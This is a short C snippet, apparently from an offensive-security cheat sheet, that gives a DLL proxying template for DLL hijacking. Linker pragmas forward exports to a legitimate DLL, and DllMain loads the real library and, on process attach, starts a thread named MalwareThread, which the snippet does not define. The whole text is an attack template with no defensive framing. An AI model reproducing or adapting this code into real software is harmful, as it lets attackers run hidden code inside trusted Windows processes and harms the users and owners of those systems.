// 🔴 DLL Hijacking - DLL Proxying
// Original DLL exports
#pragma comment(linker, "/export:OriginalFunction1=legit.dll.OriginalFunction1")
#pragma comment(linker, "/export:OriginalFunction2=legit.dll.OriginalFunction2")

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        // Disable thread notifications
        DisableThreadLibraryCalls(hModule);
        
        // Load real DLL
        HMODULE hRealDll = LoadLibraryA("C:\\Windows\\System32\\legit_real.dll");
        
        // Execute malware
        CreateThread(NULL, 0, MalwareThread, NULL, 0, NULL);
    }
    return TRUE;
}